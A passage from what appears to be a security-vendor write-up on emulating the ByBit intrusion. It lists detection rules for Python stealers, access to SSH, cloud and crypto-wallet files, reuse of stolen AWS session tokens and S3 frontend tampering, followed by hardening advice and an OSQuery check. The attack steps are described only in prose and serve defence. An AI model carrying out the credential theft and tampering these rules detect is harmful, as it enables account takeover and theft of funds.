**Rule Name: “[Python Library Load and Delete](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_python_library_load_and_delete.md)”:** Detects when a shared library, located within the users home directory, gets loaded by Python followed by the deletion of the library shortly after by the same Python process.

**Rule Name: “[Unusual Library Load via Python](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unusual_library_load_via_python.md)”:** Detects when a shared library gets loaded by Python that does not denote itself as a .dylib or .so file and is located within the users home directory.

**Rule Name: “[In-Memory JXA Execution via ScriptingAdditions](https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/defense_evasion_potential_in_memory_jxa_load_via_untrusted_or_unsigned_binary.toml)”:** Detects the in-memory load and execution of a JXA script.

##### Python Loader Script Ret == 2

**Rule Name: “[Potential Python Stealer](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/credential_access_potential_python_stealer.md)”:** Detects when a Python script gets executed followed shortly after by at least three attempts to access sensitive files by the same Python process.

**Rule Name: “[Self-Deleted Python Script Accessing Sensitive Files](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleted_python_script_accessing_sensitive_files.md)”:** Detects when a Python script gets deleted and sensitive files are accessed shortly after by the same Python process.

##### Python Loader Script Ret == 3

**Rule Name: “[Unsigned or Untrusted Binary Execution via Python](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_execution_via_python.md)”:** Detects when an unsigned or untrusted binary gets executed by Python where the executable is located within a suspicious directory.

**Rule Name: “[Unsigned or Untrusted Binary Fork via Python](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_unsigned_or_untrusted_binary_fork_via_python.md)”:** Detects when an unsigned or untrusted binary gets fork exec’d by Python where the process argument is the path to a file within the users home directory.

**Rule Name: “[Cloud Credential Files Accessed by Process in Suspicious Directory](https://github.com/elastic/endpoint-rules/blob/13bad7e92e53f078b97bbeb376aedb23797be21b/rules/macos/credential_access_cloud_credential_file_accessed_by_untrusted_or_unsigned_process.toml)”:** Detects when cloud credentials are accessed by a process running from a suspicious directory.

#### SIEM Detections for AWS CloudTrail Logs

**Rule Name: “[STS Temporary IAM Session Token Used from Multiple Addresses](https://github.com/elastic/detection-rules/blob/44a2f4c41aa1482ec545f0391040e254c29a8d80/rules/integrations/aws/initial_access_iam_session_token_used_from_multiple_addresses.toml)”:** Detects AWS IAM session tokens (e.g. ASIA\*) being used from multiple source IP addresses in a short timeframe, which may indicate credential theft and reuse from adversary infrastructure.

**Rule Name: “[IAM Attempt to Register Virtual MFA Device with Temporary Credentials](https://github.com/elastic/detection-rules/blob/2f4a310cc5d75f8d8f2a2d0f5ad5e5a4537e26a3/rules/integrations/aws/persistence_aws_attempt_to_register_virtual_mfa_device.toml)”:** Detects attempts to call CreateVirtualMFADevice or EnableMFADevice with AWS session tokens. This may reflect an attempt to establish persistent access using hijacked short-term credentials.

**Rule Name: “[API Calls to IAM via Temporary Session Tokens](https://github.com/elastic/detection-rules/blob/b64ecc925304b492d7855d357baa6c68711eef9a/rules/integrations/aws/persistence_iam_sts_api_calls_via_user_session_token.toml)”:** Detects use of sensitive iam.amazonaws.com API operations by a principal using temporary credentials (e.g. session tokens with ASIA\* prefix). These operations typically require MFA or should only be performed via the AWS console or federated users. Not CLI or automation tokens.

**Rule Name: “[S3 Static Site JavaScript File Uploaded via PutObject](https://github.com/elastic/detection-rules/blob/29dfe1217d1320ab400d051de377664fdbb09493/rules/integrations/aws/impact_s3_static_site_js_file_uploaded.toml)”:** Identifies attempts by IAM users to upload or modify JavaScript files in the static/js/ directory of an S3 bucket, which can signal frontend tampering (e.g. injection of malicious code)

**Rule Name: “[AWS CLI with Kali Linux Fingerprint Identified](https://github.com/elastic/detection-rules/blob/b35f7366e92321105f61249b233f436c40b59c19/rules/integrations/aws/initial_access_kali_user_agent_detected_with_aws_cli.toml)”:** Detects AWS API calls made from a system using Kali Linux, as indicated by the user\_agent.original string. This may reflect attacker infrastructure or unauthorized access from red team tooling.

**Rule Name: “[S3 Excessive or Suspicious GetObject Events](https://github.com/elastic/detection-rules/blob/main/hunting/aws/queries/s3_public_bucket_rapid_object_access_attempts.toml)”:** Detects a high volume of S3 GetObject actions by the same IAM user or session within a short time window. This may indicate S3 data exfiltration using tools like AWS CLI command *sync* \- particularly targeting static site files or frontend bundles. Note, this is a hunting query and should be adjusted accordingly.

#### SIEM Detections for Docker Abuse

**Rule Name: “[Sensitive File Access via Docker](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_file_access_via_docker.md)”:** Detects when Docker accesses sensitive host files (“ssh”, “aws”, “gcloud”, “azure”, “web browser”, “crypto wallet files”). 

**Rule Name: “[Suspicious Executable File Modification via Docker](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_suspicious_executable_file_modification_via_docker.md)”:** Detects when Docker creates or modifies an executable file within a suspicious or unusual directory. 

If your macOS agent policy includes the [Docker data integration](https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container), you can collect valuable telemetry that helps surface malicious container activity on user systems. In our emulation, this integration allowed us to ingest Docker logs (into the metrics index), which we then used to build a detection rule capable of identifying indicators of compromise and suspicious container executions associated with the malicious application.

![](/assets/images/bit-bybit/image17.png)

## Mitigations

### Social Engineering 

Social engineering plays a major role in many intrusions, but especially with the DPRK. They are highly adept at targeting and approaching their victims utilizing trusted public platforms like LinkedIn, Telegram, X or Discord to initiate contact and appear legitimate. Many of their social engineering campaigns attempt to convince the user to download and execute some kind of project, application or script whether it be out of necessity (job application), distress (debugging assistance) etc.. Mitigation of targeting that leverage social engineering is difficult and takes a concerted effort by a company to ensure their employees are regularly trained to recognize these attempts, applying the proper skepticism and caution when engaging outside entities and even the open source communities. 

* User Awareness Training
* Manual Static Code Review 
* Static Code and Dependency Scanning

Bandit ([GitHub - PyCQA/bandit: Bandit is a tool designed to find common security issues in Python code.](https://github.com/PyCQA/bandit)) is a great example of an open source tool a developer could use to scan the Python application and its scripts prior to execution in order to surface common Python security vulnerabilities or dangerous issues that may be present in the code.

![](/assets/images/bit-bybit/image19.png)

### Application and Device Management

Application controls via a device management solution or a binary authorization framework like the open source tool Santa ([GitHub - northpolesec/santa: A binary and file access authorization system for macOS.](https://github.com/northpolesec/santa)) could have been used to enforce notarization and block execution from suspicious paths. This would have prevented the execution of the Poseidon payload dropped to the system for persistence, and could have prevented access to sensitive files.

### EDR/XDR

To effectively defend against nation-state threats—and the many other attacks targeting macOS—it's critical to have an EDR solution in place that provides rich telemetry and correlation capabilities to detect and prevent script-based attacks. Taking it a step further, an EDR platform like Elastic allows you to ingest AWS logs alongside endpoint data, enabling unified alerting and visibility through a single pane of glass. When combined with AI-powered correlation, this approach can surface cohesive attack narratives, significantly accelerating response and improving your ability to act quickly if such an attack occurs.

![Elastic Alerts Dashboard](/assets/images/bit-bybit/image3.png)

### AWS Credential Exposure and Session Token Hardening

In this attack, the adversary leveraged a stolen AWS user session token (with the ASIA* prefix), which had been issued via the GetSessionToken API using MFA. These credentials were likely retrieved from the macOS developer environment — either from exported environment variables or default AWS config paths (e.g., `~/.aws/credentials`).

To mitigate this type of access, organizations can implement the following defensive strategies:

1. **Reduce Session Token Lifetimes and Move Away from IAM Users**: Avoid issuing long-lived session tokens to IAM users. Instead, enforce short token durations (e.g., 1 hour or less) and adopt AWS SSO (IAM Identity Center) for all human users. This makes session tokens ephemeral, auditable, and tied to identity federation. Disabling sts:GetSessionToken permissions for IAM users altogether is the strongest approach, and IAM Identity Center allows this transition.
2. **Enforce Session Context Restrictions for IAM API Usage**: Implement IAM policy condition blocks that explicitly deny sensitive IAM operations, such as *iam:CreateVirtualMFADevice* or *iam:AttachUserPolicy*, if the request is made using temporary credentials. This ensures that session-based keys, such as those used in the attack, cannot escalate privileges or modify identity constructs.
3. **Limit MFA Registration to Trusted Paths**: Block MFA device creation (*CreateVirtualMFADevice*, *EnableMFADevice*) via session tokens unless coming from trusted networks, devices, or IAM roles. Use *aws:SessionToken* or *aws:ViaAWSService* as policy context keys to enforce this. This would have prevented the adversary from attempting MFA-based persistence using the hijacked session.

### S3 Application Layer Hardening (Frontend Tampering)

After obtaining the AWS session token, the adversary did not perform any IAM enumeration — instead, they pivoted quickly to S3 operations. Using the AWS CLI and temporary credentials, they listed S3 buckets and modified static frontend JavaScript hosted on a public S3 bucket. This allowed them to replace the production Next.js bundle with a malicious variant designed to redirect transactions based on specific wallet addresses.

To prevent this type of frontend tampering, implement the following hardening strategies:

1. **Enforce Immutability with S3 Object Lock**: Enable S3 Object Lock in compliance or governance mode on buckets hosting static frontend content. This prevents overwriting or deletion of files for a defined retention period - even by compromised users. Object Lock adds a strong immutability guarantee and is ideal for public-facing application layers. Access to put new objects (rather than overwrite) can still be permitted via deployment roles.
2. **Implement Content Integrity with Subresource Integrity (SRI)**: Include SRI hashes (e.g., SHA-256) in the &lt;script> tags within index.html to ensure the frontend only executes known, validated JavaScript bundles. In this attack, the lack of integrity checks allowed arbitrary JavaScript to be served and executed from the S3 bucket. SRI would have blocked this behavior at the browser level.
3. **Restrict Upload Access Using CI/CD Deployment Boundaries**: Developers should never have direct write access to production S3 buckets. Use separate AWS accounts or IAM roles for development and CI/CD deployment. Only OIDC-authenticated GitHub Actions or trusted CI pipelines should be permitted to upload frontend bundles to production buckets. This ensures human credentials, even if compromised, cannot poison production.
4. **Lock Access via CloudFront Signed URLs or Use S3 Versioning**: If the frontend is distributed via CloudFront, restrict access to S3 using signed URLs and remove public access to the S3 origin. This adds a proxy and control layer. Alternatively, enable S3 versioning and monitor for overwrite events on critical assets (e.g., /static/js/*.js). This can help detect tampering by adversaries attempting to replace frontend files.

## Attack Discovery (AD)

After completing the end-to-end attack emulation, we tested Elastic’s new AI Attack Discovery feature to see if it could connect the dots between the various stages of the intrusion. Attack Discovery integrates with an LLM of your choice to analyze alerts across your stack and generate cohesive attack narratives. These narratives help analysts quickly understand what happened, reduce response time, and gain high-level context. In our test, it successfully correlated the endpoint compromise with the AWS intrusion, providing a unified story that an analyst could use to take informed action.

![Elastic Attack Discovery](/assets/images/bit-bybit/image10.png)

## OSQuery

When running Elastic Defend through Elastic Agent, you can also deploy the OSQuery Manager integration to centrally manage Osquery across all agents in your Fleet. This enables you to query host data using distributed SQL. During our testing of the Dockerized malicious application, we used OSQuery to inspect the endpoint and successfully identified the container running with privileged permissions. 

```sql
SELECT name, image, readonly_rootfs, privileged FROM docker_containers
```

![Elastic OSQuery Live Query](/assets/images/bit-bybit/image18.png)

We scheduled this query to run on a recurring basis, sending results back to our Elastic Stack. From there, we built a threshold-based detection rule that alerts whenever a new privileged container appears on a user’s system and hasn’t been observed in the past seven days.

## Conclusion

The ByBit attack was one of the most consequential intrusions attributed to DPRK threat actors—and thanks to detailed reporting and available artifacts, it also provided a rare opportunity for defenders to emulate the full attack chain end to end. By recreating the compromise of a SAFE developer’s macOS workstation—including initial access, payload execution, and AWS pivoting—we validated our detection capabilities against real-world nation-state tradecraft.

This emulation not only highlighted technical insights—like how PyYAML deserialization can be abused to gain initial access—but also reinforced critical lessons in operational defense: the value of user awareness, behavior-based EDR coverage, secure developer workflows, effective cloud IAM policies, cloud logging and holistic detection/response across platforms.

Adversaries are innovating constantly, but so are defenders—and this kind of research helps tip the balance. We encourage you to follow [@elasticseclabs](https://x.com/elasticseclabs) and check out our threat research at [elastic.co/security-labs](https://www.elastic.co/security-labs) to stay ahead of evolving adversary techniques.

Resources:

1. [Bybit – What We Know So Far](https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/)
2. [Safe.eth on X: "Investigation Updates and Community Call to Action"](https://x.com/safe/status/1897663514975649938)
3. [Cryptocurrency APT Intelligence: Unveiling Lazarus Group’s Intrusion Techniques](https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34)
4. [Slow Pisces Targets Developers With Coding Challenges and Introduces New Customized Python Malware](https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/)
5. [Code of Conduct: DPRK’s Python-fueled intrusions into secured networks](https://www.elastic.co/security-labs/dprk-code-of-conduct)
6. [Elastic catches DPRK passing out KANDYKORN](https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn)